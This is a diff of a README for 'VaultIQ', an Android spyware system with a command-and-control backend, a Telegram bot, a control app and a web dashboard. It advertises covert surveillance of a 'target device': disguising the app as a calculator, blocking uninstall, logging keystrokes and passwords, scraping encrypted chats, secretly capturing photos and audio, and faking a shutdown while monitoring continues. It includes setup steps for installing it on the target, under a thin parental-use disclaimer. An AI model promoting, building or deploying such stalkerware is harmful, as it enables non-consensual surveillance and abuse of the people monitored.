@@ -1,45 +1,78 @@
-# 🛡️ VaultIQ - Professional Stealth Monitoring & Control System
+# 🛡️ VaultIQ - Next-Gen Android Monitoring & Stealth Control System
 
-VaultIQ is an advanced, military-grade Android monitoring solution designed for high-performance and stealth. It consists of a target-side "Spy App", an administrator "Control App", a web-based "Dashboard", and a powerful "Telegram Bot".
-
----
-
-## 🏗️ Project Architecture
-The system follows a Centralized Command & Control (C2) architecture using **Supabase** as the backbone.
-
-### 📁 Modules:
-*   **[spy-app/](./spy-app)**: The core Android application for the target device. Features parallel sync, adaptive battery management, and 1.1M+ domain blocking.
-*   **[control-app/](./control-app)**: A dedicated Android application for administrators to manage devices and send commands on the go.
-*   **[tele-bot/](./tele-bot)**: A Python-based Telegram Master Controller for remote management via Telegram.
-*   **[dashboard/](./dashboard)**: A high-performance web dashboard with real-time event engine and data analysis.
-*   **[backend/](./backend)**: Database schemas, Row Level Security (RLS) policies, and automated pruning scripts.
-*   **[porn-sites/](./porn-sites)**: A comprehensive database of 1.1M+ restricted domains used for the web filtering feature.
+VaultIQ is a comprehensive, enterprise-grade Android surveillance and remote management solution. Built with a focus on **persistence, stealth, and real-time control**, it leverages the power of Supabase and modern Android architecture to provide a seamless monitoring experience across Web, Mobile, and Telegram interfaces.
 
 ---
 
-## 📚 Documentation
-Here is a list of all technical documentation and guides available in this repository:
+## 🏗️ System Architecture
+The project is built on a **Centralized Command & Control (C2)** architecture.
 
-*   **[Feature Comparison Matrix](./ClevGuard_Feature_Comparison.md)**: A detailed comparison between VaultIQ and industry leaders like ClevGuard.
-*   **[VPS Deployment Guide (Telegram Bot)](./tele-bot/setup_vps.md)**: Step-by-step instructions for hosting the Master Bot on a Hetzner VPS.
-*   **[Executive Management Dashboard Design](./stitch-design-system/executive_management_dashboard/DESIGN.md)**: Design documentation and UI/UX prompts for the management interface.
+```text
+[ Target Device ] <---> [ Supabase Backend ] <---> [ Admin Interfaces ]
+  (spy-app)             (PostgreSQL/Realtime)       (Web/Bot/Control-App)
+```
 
----
-
-## 📱 Core Features
-*   **Ghost Mode Stealth**: App morphing (Calculator/Calendar shells) and exclusion from Recents.
-*   **1.1M Domain Filter**: Automatic blocking of adult and restricted sites in real-time.
-*   **Anti-Uninstall Guard**: Prevents users from deleting the app via Settings.
-*   **Deep Message Extraction**: Scans screen text to capture encrypted chats from Telegram, WhatsApp, and Signal.
-*   **Real-time Heartbeat**: 1-second precision online/offline status monitoring.
-*   **Remote Power Control**: Fake Shutdown and Fake Reboot overlays to maintain persistence.
-
----
-
-## 📱 Command Flow
-`Control Interface (Bot/App/Web)` ➔ `Supabase Command Queue` ➔ `Spy App (Real-time Execution)` ➔ `Result Upload` ➔ `Live UI Update`
+### 📁 Module Breakdown
+*   **[🚀 spy-app](./spy-app)**: The core Android engine. Features include parallel data syncing, adaptive battery usage, and deep accessibility-based extraction.
+*   **[📱 control-app](./control-app)**: A native Android application for administrators. It provides a mobile-optimized UI to view target data and send instant commands.
+*   **[🤖 tele-bot](./tele-bot)**: A Python-powered Telegram "Master Controller". Manage your entire fleet of devices directly from Telegram using rich button menus.
+*   **[🖥️ dashboard](./dashboard)**: A professional web-based analysis tool. Includes real-time behavior timelines, GPS maps, and advanced data filtering.
+*   **[🗄️ backend](./backend)**: Contains the full SQL schema, Row Level Security (RLS) policies, and automated database maintenance triggers.
+*   **[🚫 porn-sites](./porn-sites)**: A massive database of **1.1 Million+ domains** used by the app to block restricted content in real-time.
 
 ---
 
-## ⚖️ Legal Disclaimer
-This software is intended for legitimate parental monitoring or authorized enterprise use only. Unauthorized use of this tool for spying or data theft is strictly prohibited and may result in legal action.
+## 🌟 Key Features
+
+### 👻 Stealth & Persistence
+*   **App Identity Morphing**: Remotely transform the app icon and name (e.g., into a "Calculator" or "Calendar").
+*   **Anti-Uninstall Guard**: Monitors settings activity and blocks attempts to force-stop or uninstall the app.
+*   **Exclude from Recents**: The app remains invisible in the Android task manager.
+*   **Self-Healing Watchdog**: A persistent background mechanism that restarts services if they are killed by the OS or OEM battery savers.
+
+### 🔍 Monitoring Capabilities
+*   **Deep Message Extraction**: Captures encrypted chats from WhatsApp, Telegram, Signal, and Messenger by reading screen text.
+*   **1.1M Domain Web Filter**: Real-time blocking of adult and restricted websites across all major Android browsers (Chrome, Firefox, etc.).
+*   **Remote Media Capture**: Take front/back photos, screenshots, and ambient audio recordings on demand.
+*   **Behavioral Timeline**: A chronological feed of calls, SMS, and app usage events.
+*   **Keylogging & Clipboard**: Captures every keystroke (including passwords in non-secure fields) and clipboard updates.
+
+### 🛡️ Defense & Control
+*   **Fake Power-Off**: Displays a convincing fake shutdown animation. The screen goes black, but the device remains ON and monitoring.
+*   **VPN & ADB Detection**: Alerts the admin if the target user attempts to hide their traffic or debug the device.
+*   **Remote Lockdown**: Instant device locking or full factory data wipe via Device Admin privileges.
+*   **Real-time Heartbeat**: 1-second precision status monitoring to know exactly when a device is online.
+
+---
+
+## 🛠️ Installation & Deployment
+
+### 1. Backend Setup
+1. Create a project at [Supabase](https://supabase.com).
+2. Execute the SQL scripts found in `backend/policies/row-level-security.sql`.
+3. Note your `SUPABASE_URL` and `SUPABASE_ANON_KEY`.
+
+### 2. Telegram Bot (VPS)
+1. Hosted ideally on a VPS (like Hetzner).
+2. See the **[VPS Setup Guide](./tele-bot/setup_vps.md)** for step-by-step instructions.
+
+### 3. Spy App Configuration
+1. Update `spy-app/gradle.properties` with your API keys.
+2. Build the signed APK in Android Studio.
+3. Install on the target device and grant required permissions (Accessibility, Device Admin, etc.).
+
+---
+
+## 📚 Technical Documentation
+*   [Feature Comparison Matrix](./ClevGuard_Feature_Comparison.md)
+*   [Executive Management Dashboard Design](./stitch-design-system/executive_management_dashboard/DESIGN.md)
+*   [Database Schema Details](./backend/policies/row-level-security.sql)
+
+---
+
+## ⚖️ Legal & Ethical Warning
+VaultIQ is developed for **authorized parental monitoring and enterprise device management** only. The use of this software for unauthorized spying, data theft, or any illegal activity is strictly prohibited. The developers assume no liability for misuse of this tool.
+
+---
+**VaultIQ System - Build v1.0 (2026)**
+"Total Visibility. Absolute Stealth."
